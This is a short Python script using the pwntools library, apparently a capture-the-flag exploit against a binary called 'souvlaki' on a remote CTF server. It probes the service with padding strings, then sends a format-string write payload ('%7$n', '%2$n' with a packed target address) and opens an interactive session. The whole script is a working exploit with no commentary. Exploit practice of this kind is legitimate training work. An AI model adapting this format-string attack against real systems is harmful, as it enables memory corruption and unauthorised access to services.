from pwn import *

if args.REMOTE:
    p = remote('ctf.pwn.sg', 4006)
else:
    p = process('./souvlaki')

for i in range(37, 129):
    p.recvuntil(': ')
    p.send('A'*i)
    out = p.recvline()[:-1]
    if i == 128:
        print(out.split(' ')[-5:-1])


p.recvuntil(': ')
p.send('A%7$nA%2$n'.ljust(128, 'A')+p32(0x00098c9c+4))
p.interactive()
    


